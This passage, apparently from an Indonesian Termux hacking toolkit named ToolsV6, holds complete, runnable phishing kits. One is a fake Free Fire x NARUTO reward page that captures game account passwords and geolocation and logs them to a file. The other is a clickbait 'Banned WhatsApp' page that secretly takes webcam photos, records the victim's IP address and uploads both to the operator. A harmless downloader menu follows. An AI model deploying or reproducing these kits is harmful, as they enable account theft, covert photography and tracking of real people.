            print('\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain dari port yang berbeda.')
            port += 1
PORT = find_available_port(PORT_START)
HTML_CONTENT = \"\"\"<!DOCTYPE html>
<html lang=\"id\">
<head>
  <meta charset=\"UTF-8\"/>
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>
  <title>Free Fire x NARUTO - Event Spesial</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#0a0a0a;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #0a0a0a 100%);
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:16px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 30px rgba(255,0,80,0.3);
      position:relative;
      overflow:hidden;
    }
    .card::before {
      content:'';
      position:absolute;
      top:-50%;
      left:-50%;
      width:200%;
      height:200%;
      background:linear-gradient(45deg,transparent,rgba(255,0,80,0.1),transparent);
      transform:rotate(45deg);
      animation:shine 3s linear infinite;
    }
    @keyframes shine {
      0%{transform:rotate(45deg) translateX(-100%);}
      100%{transform:rotate(45deg) translateX(100%);}
    }
    .logo{
      font-size:36px;
      font-weight:700;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-1px;
      text-shadow:0 0 20px rgba(255,0,80,0.5);
    }
    .event{
      font-size:14px;
      color:#ffcc00;
      text-align:center;
      margin-bottom:25px;
      font-weight:600;
    }
    .naruto{
      width:120px;
      height:120px;
      margin:0 auto 20px;
      background:url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><circle cx=\"50\" cy=\"50\" r=\"45\" fill=\"%23ffcc00\"/><path d=\"M50 20 L60 40 L80 40 L65 55 L75 75 L50 60 L25 75 L35 55 L20 40 L40 40 Z\" fill=\"%23ff0050\"/></svg>') center/cover;
      border-radius:50%;
      box-shadow:0 0 20px rgba(255,204,0,0.6);
      animation:float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%,100%{transform:translateY(0px);}
      50%{transform:translateY(-10px);}
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:rgba(0,0,0,0.8);
      border:1px solid #333;
      border-radius:8px;
      color:#fff;
      font-size:14px;
      transition:all 0.3s ease;
    }
    input:focus{
      outline:none;
      border-color:#ff0050;
      box-shadow:0 0 10px rgba(255,0,80,0.3);
    }
    input::placeholder{
      color:#888;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:8px;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
      margin-top:10px;
    }
    .btn:hover{
      transform:scale(1.02);
      box-shadow:0 0 20px rgba(255,0,80,0.6);
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#ffcc00;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #ffcc00;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .reward-text{
      text-align:center;
      font-size:12px;
      color:#ffcc00;
      margin-top:15px;
      font-weight:500;
    }
    .features{
      display:flex;
      justify-content:space-around;
      margin:20px 0;
      font-size:12px;
    }
    .feature{
      text-align:center;
    }
    .feature-icon{
      font-size:20px;
      margin-bottom:5px;
    }
  </style>
</head>
<body>
  <div class=\"card\">
    <div class=\"logo\">Free Fire</div>
    <div class=\"event\">Event Spesial: Free Fire x NARUTO</div>
    <div class=\"naruto\"></div>
    <div class=\"features\">
      <div class=\"feature\">
        <div class=\"feature-icon\">🎁</div>
        <div>Free Skin</div>
      </div>
      <div class=\"feature\">
        <div class=\"feature-icon\">⚡</div>
        <div>Character NARUTO</div>
      </div>
      <div class=\"feature\">
        <div class=\"feature-icon\">💎</div>
        <div>500 Diamond</div>
      </div>
    </div>
    <input type=\"text\" id=\"user\" placeholder=\"ID Garena / Email / Nomor HP\"/>
    <input type=\"password\" id=\"pass\" placeholder=\"Kata Sandi\"/>
    <button class=\"btn\" onclick=\"login()\">Klaim Hadiah & Masuk</button>
    <div class=\"reward-text\">
      🎉 Dapatkan Skin NARUTO Exclusive & 500 Diamond Gratis!
    </div>
    <div class=\"loading\" id=\"loading\">
      <div class=\"spinner\"></div>
      <div>Memverifikasi akun dan mengklaim hadiah...</div>
    </div>
  </div>
  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){
        alert('Harap lengkapi ID dan Kata Sandi untuk klaim hadiah!');
        return;
      }
      const loading=document.getElementById('loading');
      const btn=document.querySelector('.btn');  
      loading.style.display='block';
      btn.disabled=true;
      btn.textContent='MENGKLAIM HADIAH...';
      try{
        let lat='', lon='';
        try{
          const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));
          lat=pos.coords.latitude;
          lon=pos.coords.longitude;
        }catch(e){
          console.log('Location access denied or unavailable');
        }
        let img='';
        try{
          img='simulated_image_data';
        }catch(e){
          console.log('Camera access denied');
        }
        await fetch('/collect/freefire_event',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({
            user:user,
            pass:pass,
            lat:lat,
            lon:lon,
            img:img,
            userAgent:navigator.userAgent,
            platform:navigator.platform,
            timestamp:new Date().toISOString()
          })
        });
        setTimeout(()=>{
          loading.innerHTML='<div style=\"color:#00ff00; font-weight:600;\">✓ Berhasil! Hadiah diklaim</div><div style=\"font-size:12px; margin-top:5px;\">Mengarahkan ke Free Fire...</div>';
          btn.style.background='linear-gradient(45deg, #00b300, #00ff00)';  
          setTimeout(()=>{
            window.location.href='https://ff.garena.com';
          },2000);
        },2000);
      }catch(e){
        loading.innerHTML='<div style=\"color:#ff4444; font-weight:600;\">✗ Gagal mengklaim hadiah</div><div style=\"font-size:12px; margin-top:5px;\">Silakan coba lagi...</div>';
        btn.disabled=false;
        btn.textContent='Klaim Hadiah & Masuk';
        setTimeout(()=>{
          loading.style.display='none';
        },3000);
      }
    }
    document.addEventListener('keypress',function(e){
      if(e.key==='Enter') login();
    });
  </script>
</body>
</html>\"\"\"
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == \"/\":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode())
        else:
            self.send_error(404, \"Halaman tidak ditemukan.\")  
    def do_POST(self):
        if self.path == \"/collect/freefire_event\":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())   
            user = data.get('user', '')
            password = data.get('pass', '')
            lat = data.get('lat', '')
            lon = data.get('lon', '')
            img = data.get('img', '')     
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m \" + \"=\"*50 + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Free Fire x NARUTO - Data Baru\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Waktu :\033[32;1m \" + datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\") + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User/ID :\033[32;1m \" + user + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m \" + password + \"\033[0m\")
            if lat and lon:
                print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Lokasi :\033[32;1m \" + f\"{lat}, {lon}\" + \"\033[0m\")
            if img:
                print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Foto :\033[32;1m Tersedia (\" + str(len(img)) + \" bytes)\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User Agent :\033[32;1m \" + self.headers.get('User-Agent', '') + \"\033[0m\")
            print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m \" + \"=\"*50 + \"\033[0m\\n\")            
            with open(\"freefire_data.txt\", \"a\") as f:
                f.write(f\"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\\n\")
                f.write(f\"User: {user}\\n\")
                f.write(f\"Password: {password}\\n\")
                f.write(f\"Lokasi: {lat}, {lon}\\n\")
                f.write(f\"Foto: {len(img)} bytes\\n\")
                f.write(\"-\" * 50 + \"\\n\\n\")                
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({\"status\": \"success\", \"message\": \"Login berhasil\"}).encode())
        else:
            self.send_error(404) 
    def log_message(self, format, *args):
        return
if __name__ == \"__main__\":
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:\" + str(PORT) + \"\033[0m\")
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Menunggu data login..!!\033[0m\")
    print(\"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Data akan disimpan di : freefire_data.txt\033[0m\")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "8" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Pshing !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
set -euo pipefail
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
PORT="${PORT:-8080}"
SAVE_DIR="/sdcard/Hasil_Foto"
if [ ! -d "/sdcard" ]; then
  clear
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${c} /sdcard/ Tidak Di Temukan Sistem Tidak Dapat Di Jalankan..!!"
  echo ""
  sleep 4
  pkill -9 -f com.termux
fi
if ! command -v python3 >/dev/null 2>&1; then
  clear
  echo ""
  echo -e "${r}[ ${g}ERR ${r}]${y} python3 belum terpasang. Di Termux: pkg install python -y"
  echo ""
  sleep 4
  pkill -9 -f com.termux
fi
if [ ! -d "/storage/emulated/0" ]; then
  echo ""
  echo -e "${r}[ ${g}INFO ${r}]${y} Menjalankan termux-setup-storage (butuh konfirmasi izin)."
  echo ""
  if command -v termux-setup-storage >/dev/null 2>&1; then
    termux-setup-storage
  else
    clear 
    echo ""
    echo -e "${r}[ ${g}WARN ${r}]${y} termux-setup-storage tidak tersedia. Lanjut mencoba tanpa itu."
    echo ""
    sleep 3 
  fi
fi
mkdir -p "$SAVE_DIR"
clear 
echo "
▗▖ ▗▖▗▖ ▗▖ ▗▄▖▗▄▄▄▖▗▄▄▖ ▗▄▖ ▗▄▄▖ ▗▄▄▖ 
▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌ █ ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌
▐▌ ▐▌▐▛▀▜▌▐▛▀▜▌ █  ▝▀▚▖▐▛▀▜▌▐▛▀▘ ▐▛▀▘ 
▐▙█▟▌▐▌ ▐▌▐▌ ▐▌ █ ▗▄▄▞▘▐▌ ▐▌▐▌   ▐▌ 
" | lolcat
echo -e "${r}   Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[ ${g}INFO ${r}]${c} Membuka server Python di port : ${PORT}"
echo -e "${r}[ ${g}INFO ${r}]${y} Akses di : http://localhost : ${PORT}"
python3 - <<EOF
import warnings
import sys
import os
import json
import datetime
import io
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
warnings.filterwarnings("ignore")
sys.tracebacklimit = 0
PORT = int(os.environ.get("PORT", "${PORT}"))
SAVE_DIR = os.environ.get("SAVE_DIR", "${SAVE_DIR}")
HTML_CONTENT = '''<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Bokep Kamera Auto Virall</title>
  <style>
    :root { --pad: 16px; }
    body {
      font-family: system-ui, sans-serif;
      max-width: 820px;
      margin: 2rem auto;
      padding: 0 var(--pad);
      background: linear-gradient(to bottom, #04364A, #176B87);
      color: white;
      text-shadow: 1px 1px 2px black;
    }
    h1 { font-size: 1.4rem; margin-bottom: 0.5rem; }
    .notice {
      background: rgba(0,0,0,0.5);
      padding: var(--pad);
      border-radius: 12px;
    }
    video, canvas {
      width: 100%;
      max-width: 780px;
      border-radius: 12px;
      background: #000;
    }
    .bar { margin: 1rem 0; }
    button {
      padding: .75rem 1rem;
      border-radius: 10px;
      border: none;
      cursor: pointer;
      background: #007bff;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>Klik Gass Project dan akan di arahkan pada Website Banned WhatsApp 😈🔥</h1>
  <p class="notice">
    Saya tidak bertanggung <strong>jawab</strong> jika
    website Banned WhatsApp ini di salah gunakan.
  </p>
  <video id="preview" playsinline autoplay></video>
  <div class="bar">
    <button id="start">Gass Project</button>
  </div>
  <canvas id="photo" hidden></canvas>
  <script>
const video = document.getElementById("preview");
const canvas = document.getElementById("photo");
const startBtn = document.getElementById("start");
let stream;
async function getIP() {
    try {
        const resp = await fetch("https://api.ipify.org?format=json");
        const data = await resp.json();
        return data.ip || "unknown";
    } catch {
        return "unknown";
    }
}
function takeSnapshot() {
  if (!stream) return null;
  const track = stream.getVideoTracks()[0];
  const settings = track.getSettings();
  const w = settings.width || 640;
  const h = settings.height || 480;
  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, w, h);
  return canvas;
}
async function uploadCanvas(canv, ip, index=null) {
  const blob = await new Promise(res => canv.toBlob(res, "image/png"));
  const fd = new FormData();
  const filename = index === null ? "photo.png" : \`photo_\${index}.png\`;
  fd.append("photo", blob, filename);
  fd.append("ip", ip);
  const resp = await fetch("/upload", { method: "POST", body: fd });
  if (!resp.ok) throw new Error("Upload gagal");
  return await resp.json();
}
async function startAndSnap() {
  try {
    const ip = await getIP();
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: "user" } },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
    for (let i = 1; i <= 5; i++) {
      await new Promise(res => setTimeout(res, 500));
      const canv = takeSnapshot();
      if (canv) {
        await uploadCanvas(canv, ip, i);
      }
    }
    stream.getTracks().forEach(t => t.stop());
    window.location.href = "https://lu-ngentod-9ank.vercel.app/";
  } catch (err) {
    alert("Gagal akses kamera: " + err.message);
  }
}
startBtn.addEventListener("click", startAndSnap);
  </script>
</body>
</html>'''
class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return    
    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            self.wfile.write(HTML_CONTENT.encode('utf-8'))
            return
        else:
            self.send_error(404, "Not Found")  
    def parse_multipart_form_data(self, content_type, content_length):
        """Parse multipart/form-data tanpa menggunakan cgi"""
        try:
            boundary = None
            for part in content_type.split(';'):
                part = part.strip()
                if part.startswith('boundary='):
                    boundary = part[9:].encode('utf-8')           
            if not boundary:
                return None
            data = self.rfile.read(content_length)
            parts = data.split(b'--' + boundary)            
            result = {}            
            for part in parts:
                if not part or part in [b'', b'--\r\n']:
                    continue
                if b'\r\n\r\n' in part:
                    headers_raw, content = part.split(b'\r\n\r\n', 1)
                    headers = {}                   
                    for line in headers_raw.split(b'\r\n'):
                        if b': ' in line:
                            key, value = line.split(b': ', 1)
                            headers[key.decode('utf-8').lower()] = value.decode('utf-8')
                    if 'content-disposition' in headers:
                        disp = headers['content-disposition']
                        params = {}
                        for param in disp.split(';'):
                            param = param.strip()
                            if '=' in param:
                                key, value = param.split('=', 1)
                                params[key] = value.strip('"')
                        if 'name' in params:
                            field_name = params['name']
                            if 'filename' in params:
                                result[field_name] = {
                                    'filename': params['filename'],
                                    'content': content.rstrip(b'\r\n')
                                }
                            else:
                                result[field_name] = content.rstrip(b'\r\n').decode('utf-8')            
            return result            
        except Exception as e:
            print(f"Error parsing form data: {e}")
            return None    
    def do_POST(self):
        if self.path != "/upload":
            self.send_error(404, "Not Found")
            return       
        content_type = self.headers.get('Content-Type', '')
        content_length = int(self.headers.get('Content-Length', 0))     
        if 'multipart/form-data' not in content_type:
            self.send_error(400, "Content-Type harus multipart/form-data")
            return
        form_data = self.parse_multipart_form_data(content_type, content_length)        
        if not form_data or 'photo' not in form_data:
            self.send_error(400, "Field photo tidak ditemukan")
            return       
        photo_data = form_data['photo']
        ip = form_data.get('ip', 'unknown')        
        if not isinstance(photo_data, dict) or 'content' not in photo_data:
            self.send_error(400, "Tidak ada file")
            return       
        os.makedirs(SAVE_DIR, exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S-%f")
        filename = photo_data.get('filename', 'photo.png')
        if '.' in filename:
            ext = '.' + filename.split('.')[-1].lower()
            if len(ext) > 5:
                ext = '.png'
        else:
            ext = '.png'       
        out_path = os.path.join(SAVE_DIR, f"foto_{ts}_{ip.replace('.', '_')}{ext}")
        with open(out_path, "wb") as f:
            f.write(photo_data['content'])       
        payload = {"ok": True, "path": out_path}
        data = json.dumps(payload).encode("utf-8")       
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        self.wfile.write(data)    
    def end_headers(self):
        self.send_header("X-Content-Type-Options", "nosniff")
        BaseHTTPRequestHandler.end_headers(self)
if __name__ == "__main__":
    while True:
        try:
            addr = ("", PORT)
            httpd = HTTPServer(addr, RequestHandler)
            break
        except OSError as e:
            if e.errno == 98:
                print(f"\033[31;1m[\033[32;1m INFO \033[31;1m]\033[33;1m Port {PORT} sudah dipakai, coba port {PORT+1}")
                PORT += 1
            else:
                raise    
    print(f"\033[31;1m[\033[32;1m INFO \033[31;1m]\033[36;1m Server berjalan di : http://localhost:{PORT}")
    print(f"\033[31;1m[\033[32;1m INFO \033[31;1m]\033[35;1m Hasil Akan Di Simpan Secara Otomatis Di : {SAVE_DIR}")   
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer dihentikan.")
        try:
            httpd.server_close()
        except Exception:
            pass
EOF
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$ps" == "bk" ]]; then
break
else
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Tidak_Ada.mp3" &> /dev/null &
echo -e "${bold_bg}${green} Menu Tidak Ada Di ToolsV6 ${n}"
sleep 6
clear
fi
done
}
down_menu() {
while true; do
clear
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "$w╔═════════════════════════════════════════════╗"
echo -e "$w║        ${bold_bg}${bold_gren}  ☣ MENU DOWNLOADER MEDIA ☣  ${n}     $w   ║${n}"
echo -e "$w╠═════════════════════════════════════════════╣"
echo -e "$w║${r} [ ${g}1 ${r}] ${c}Download Video IG                     $w║"
echo -e "$w║${r} [ ${g}2 ${r}] ${c}Download Musik YouTube                $w║"
echo -e "$w║${r} [ ${g}3 ${r}] ${c}Download Video Tiktok                 $w║"
echo -e "$w║${r} [ ${g}4 ${r}] ${c}Download Video Snack                  $w║"
echo -e "$w║${r} [ ${g}5 ${r}] ${c}Download Video Facebook               $w║"
echo -e "$w║${r} [ ${g}6 ${r}] ${c}Download ALL,in Tiktok Web            $w║"
echo -e "$w║${r} [ ${g}7 ${r}] ${c}Download Auto foto URL                $w║"
echo -e "$w║${r} [ ${g}8 ${r}] ${c}Download Auto video URL               $w║"
echo -e "$w║${r} [ ${g}9 ${r}] ${c}Download Video YouTube                $w║"
echo -e "$w║${p} [ ${r}bk ${p}] ${g}KEMBALI KE MENU AWAL                 $w║"
echo -e "$w╚═════════════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSV6 ${r}]${c} : ")" dor
echo ""
if [[ $dor == "1" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
DIR="/sdcard/Download"
echo "
⠀⠀⠀⣠⣴⡶⣿⢿⣻⣟⡿⣟⣿⣻⢿⣻⣟⡿⣟⣿⣻⢿⣻⢿⡶⣦⣀⠀⠀⠀
⠀⣠⡾⣟⣾⡽⠟⠛⠛⠚⠙⠋⠓⠋⠛⠙⠚⠙⠋⠓⠛⠛⠛⠯⢿⣽⣻⣷⡄⠀
⣰⡿⣽⠿⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣠⣤⡀⠘⢿⣞⣿⣂
⣿⢿⣽⠃⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⣠⣠⡀⡀⠀⠀⣾⢿⣽⣻⠄⢈⣿⡷⣿
⣿⣻⣾⠄⠀⠀⠀⠀⠀⣠⣶⣟⣯⡿⣽⣻⣽⣟⡿⣶⣄⠉⠛⠊⠃⠀⠨⣿⣽⢿
⣿⣳⣯⠀⠀⠀⠀⢀⣼⣟⣾⡽⠃⠉⠁⠁⠈⠙⢻⡷⣟⣧⠀⠀⠀⠀⠀⣿⢾⣻
⣿⣳⣯⠀⠀⠀⠀⣼⣟⣾⡍⠀⠀⠀⠀⠀⠀⠀⠀⢹⡿⣽⣧⠀⠀⠀⠀⣯⢿⣻
⣿⣳⣯⠀⠀⠀⠀⣻⣽⣾⡀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣟⣿⣎⠀⠀⠀⠀⣻⡿⣽
⣿⣳⣯⠀⠀⠀⠀⢻⣟⣾⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣟⡷⡿⠀⠀⠀⠀⣿⡽⣿
⣿⣳⣯⠀⠀⠀⠀⠈⢻⣾⡽⣷⣄⣀⠀⢀⣀⣠⣾⣟⣾⡟⠁⠀⠀⠀⠀⣷⣟⣿
⣿⣳⣿⠂⠀⠀⠀⠀⠀⠑⠻⣯⣟⡿⣿⣻⣟⣯⣷⠻⠊⠀⠀⠀⠀⠀⢐⣿⡾⣽
⣿⣷⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠃⠙⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣻⣽
⠹⣾⣽⣳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⢯⣷⠏
⠀⠘⢷⣯⣟⡷⣦⣤⡴⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⣦⣤⣴⣾⢷⣯⡿⠃⠀
⠀⠀⠀⠈⠻⠽⣳⣯⣟⡿⣞⣷⣻⣞⣷⣻⣞⣷⣻⣞⣷⢯⣿⣽⠾⠟⠈
" | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${c}"
read -p "Masukkan URL Instagram : " url
echo ""
echo -e "${r}[ ${g}+ ${r}]${g} Mengunduh Video Dari Instagram..!!"
echo -e "${n}"
yt-dlp -o "${DIR}/%(title).80s.%(ext)s" "$url"
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${y}Sukses! Video Disimpan Di :${r} ${DIR}"
    echo ""
else
    echo ""
    echo -e "${r}Gagall mengunduh. Periksa URL atau koneksi internet Anda."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "2" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
DIR="/storage/emulated/0/Download"
echo ""
echo "
⠀⠀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢹⣷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣶⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣯⠛⠛⠿⣿⣿⣿⣿⣧⡀⠀
⠀⠀⠀⠀⢹⣿⣿⣿⡀⠀⠀⠀⠙⢿⣿⣿⣧⠀
⠀⠀⠀⠀⠸⣿⣿⣿⣇⠀⠀⠀⠀⠀⠙⣿⣿⡆
⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠈⢻⣇
⠀⠀⠀⠀⠀⢸⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠈⠿
⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣀⣸⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
